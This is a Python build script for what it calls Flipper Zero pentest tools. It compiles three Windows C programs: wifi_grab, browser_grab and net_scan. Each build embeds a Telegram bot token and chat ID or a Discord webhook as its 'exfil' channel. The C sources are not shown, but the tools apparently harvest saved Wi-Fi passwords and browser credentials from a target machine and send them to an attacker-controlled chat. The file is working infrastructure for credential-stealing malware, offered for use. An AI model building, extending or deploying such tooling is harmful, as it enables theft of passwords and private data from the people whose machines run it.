"""
Build script for Flipper Zero pentest tools.

Usage:
  python build.py wifi --telegram --token YOUR_TOKEN --chat YOUR_CHAT_ID
  python build.py wifi --discord --webhook YOUR_WEBHOOK_URL
  python build.py browser --telegram --token YOUR_TOKEN --chat YOUR_CHAT_ID
  python build.py browser --discord --webhook YOUR_WEBHOOK_URL
  python build.py all --telegram --token YOUR_TOKEN --chat YOUR_CHAT_ID

Defaults to Telegram with hardcoded token if no args given.
"""

import subprocess, os, sys

MSVC = r"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.43.34808"
SDK = r"C:\Program Files (x86)\Windows Kits\10"
SDKVER = "10.0.22000.0"
TOOL_DIR = os.path.dirname(os.path.abspath(__file__))

def compile_tool(source, output, extra_libs=None, defines=None):
    env = os.environ.copy()
    env["INCLUDE"] = ";".join([
        os.path.join(MSVC, "include"),
        os.path.join(SDK, "Include", SDKVER, "ucrt"),
        os.path.join(SDK, "Include", SDKVER, "um"),
        os.path.join(SDK, "Include", SDKVER, "shared"),
    ])
    env["LIB"] = ";".join([
        os.path.join(MSVC, "lib", "x64"),
        os.path.join(SDK, "Lib", SDKVER, "ucrt", "x64"),
        os.path.join(SDK, "Lib", SDKVER, "um", "x64"),
    ])

    cl = os.path.join(MSVC, "bin", "Hostx64", "x64", "cl.exe")
    args = [cl, "/O2", "/Fe:" + output, source]

    if defines:
        for d in defines:
            args.append("/D" + d)

    if extra_libs:
        args.extend(extra_libs)

    result = subprocess.run(args, env=env, capture_output=True, text=True, timeout=30)

    if result.returncode == 0 and os.path.exists(output):
        size = os.path.getsize(output)
        print(f"SUCCESS: {os.path.basename(output)} ({size} bytes)")
        return True
    else:
        print(f"FAILED: {result.stdout}\n{result.stderr}")
        return False


def main():
    args = sys.argv[1:]

    # Defaults
    tool = "all"
    method = "telegram"
    token = "YOUR_BOT_TOKEN"
    chat = "YOUR_CHAT_ID"
    webhook = ""

    i = 0
    while i < len(args):
        a = args[i]
        if a in ("wifi", "browser", "scan", "all"):
            tool = a
        elif a == "--telegram":
            method = "telegram"
        elif a == "--discord":
            method = "discord"
        elif a == "--token" and i + 1 < len(args):
            i += 1; token = args[i]
        elif a == "--chat" and i + 1 < len(args):
            i += 1; chat = args[i]
        elif a == "--webhook" and i + 1 < len(args):
            i += 1; webhook = args[i]
        i += 1

    # Build defines
    defines = []
    if method == "telegram":
        defines.append("USE_TELEGRAM")
        defines.append(f'TG_TOKEN="{token}"')
        defines.append(f'TG_CHAT="{chat}"')
        print(f"Building with Telegram exfil (chat: {chat[:10]}...)")
    elif method == "discord":
        defines.append("USE_DISCORD")
        defines.append(f'DC_WEBHOOK="{webhook}"')
        print(f"Building with Discord exfil (webhook: {webhook[:40]}...)")

    if tool in ("wifi", "all"):
        src = os.path.join(TOOL_DIR, "wifi_grab.c")
        out = os.path.join(TOOL_DIR, "wifi_grab.exe")
        compile_tool(src, out,
            ["wlanapi.lib", "ole32.lib", "advapi32.lib", "user32.lib"],
            defines)

    if tool in ("browser", "all"):
        src = os.path.join(TOOL_DIR, "browser_grab.c")
        out = os.path.join(TOOL_DIR, "browser_grab.exe")
        compile_tool(src, out,
            ["crypt32.lib", "bcrypt.lib", "shell32.lib", "advapi32.lib", "user32.lib", "ole32.lib"],
            defines)

    if tool in ("scan", "all"):
        src = os.path.join(TOOL_DIR, "net_scan.c")
        out = os.path.join(TOOL_DIR, "net_scan.exe")
        compile_tool(src, out,
            ["ws2_32.lib", "iphlpapi.lib", "advapi32.lib", "user32.lib"],
            defines)


if __name__ == "__main__":
    main()
